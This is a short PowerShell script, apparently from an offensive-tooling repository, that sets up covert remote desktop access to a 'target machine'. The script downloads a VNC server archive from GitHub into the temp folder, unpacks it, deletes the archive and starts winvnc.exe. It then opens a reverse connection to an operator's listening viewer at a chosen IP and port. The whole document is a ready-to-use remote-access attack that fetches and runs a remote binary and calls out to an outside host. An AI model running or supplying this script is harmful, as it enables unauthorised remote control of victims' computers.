
<# ======================== Start Uvnc client (Remote Desktop) ==========================

DOWNLOAD SERVER FILES -  https://github.com/beigeworm/assets/raw/main/uvnc-server.zip

SYNOPSIS
Downloads Uvnc client to machine and runs winvnc.exe
Veiwable from another machine with vncviewer.exe

USAGE
4. On host machine unzip 'uvnc-server.zip'
5. In extracted folder right click then click 'open in terminal'
1. Run this command with your port specified on your host machine - ./vncviewer.exe -listen 8080
2. Add your IP and PORT below
3. Run this script on a target machine

#>

$ip = "$ip"
$port = '8080'

$tempFolder = "$env:temp\vnc"
$vncDownload = "https://github.com/beigeworm/assets/raw/main/winvnc.zip"
$vncZip = "$tempFolder\winvnc.zip"

if (!(Test-Path -Path $tempFolder)) {
    New-Item -ItemType Directory -Path $tempFolder | Out-Null
}

if (!(Test-Path -Path $vncZip)) {
    Invoke-WebRequest -Uri $vncDownload -OutFile $vncZip
}
sleep 1
Expand-Archive -Path $vncZip -DestinationPath $tempFolder -Force
sleep 1
rm -Path $vncZip -Force

$proc = "$tempFolder\winvnc.exe"
Start-Process $proc -ArgumentList ("-run")
sleep 2
Start-Process $proc -ArgumentList ("-connect $ip::$port")